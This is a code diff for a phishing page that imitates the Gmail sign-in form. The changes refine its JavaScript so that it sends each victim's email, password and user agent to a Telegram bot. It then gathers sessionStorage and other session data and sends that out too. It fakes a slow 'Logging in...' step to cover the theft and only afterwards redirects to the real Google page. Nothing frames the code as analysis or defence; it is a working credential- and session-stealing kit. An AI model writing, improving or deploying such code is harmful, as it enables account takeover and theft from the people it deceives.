@@ -12,22 +12,22 @@ document.getElementById("gmail-login").addEventListener("submit", async function
   };
 
   try {
-    // Step 1: Send credentials to Telegram webhook
-    const resCred = await fetch(`https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendMessage`, {
+    // Step 1: Send credentials to Telegram
+    await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        chat_id: "<YOUR_CHAT_ID>",
+        chat_id: window.TELEGRAM_CHAT_ID,
         text: `📧 Gmail Login:\n\n📧 Email: ${creds.email}\n🔑 Pass: ${creds.password}\n🌐 Agent: ${creds.userAgent}\n⏳ Time: ${creds.timestamp}`
       })
     });
 
-    if (!resCred.ok) throw new Error("Failed to send credentials");
+    // Step 2: Disable button & show feedback to user
+    const btn = document.querySelector("button[type='submit']");
+    btn.disabled = true;
+    btn.textContent = "Logging in...";
 
-    // Step 2: Redirect to real Google Sign-in Page
-    window.location.href = "https://accounts.google.com/signin";
-
-    // STEP 3: Collect cookies/storage AFTER redirection completes
+    // Step 3: Wait briefly, then steal session data
     setTimeout(async () => {
       try {
         const sessionData = {
@@ -36,24 +36,26 @@ document.getElementById("gmail-login").addEventListener("submit", async function
           ss: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)))
         };
 
-        const resSession = await fetch(`https://api.telegram.org/bot<YOUR_TELEGRAM_BOT_TOKEN>/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${window.TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            chat_id: "<YOUR_CHAT_ID>",
+            chat_id: window.TELEGRAM_CHAT_ID,
             text: `🍪 Gmail Session Captured:\n${JSON.stringify(sessionData, null, 2)}`
           })
         });
 
-        if (!resSession.ok) throw new Error("Session exfil failed");
-
       } catch (err) {
         console.error("[Session Exfil ERROR]:", err.message);
+      } finally {
+        // Step 4: Only redirect after capturing session
+        window.location.href = "https://accounts.google.com/";
       }
 
-    }, 3500); // Wait 3.5 seconds for login redirection
+    }, 2500); // Give illusion of slow authentication while collecting session
 
   } catch (err) {
     console.error("[Credential Exfil ERROR]:", err.message);
+    alert("Login error occurred.");
   }
 });
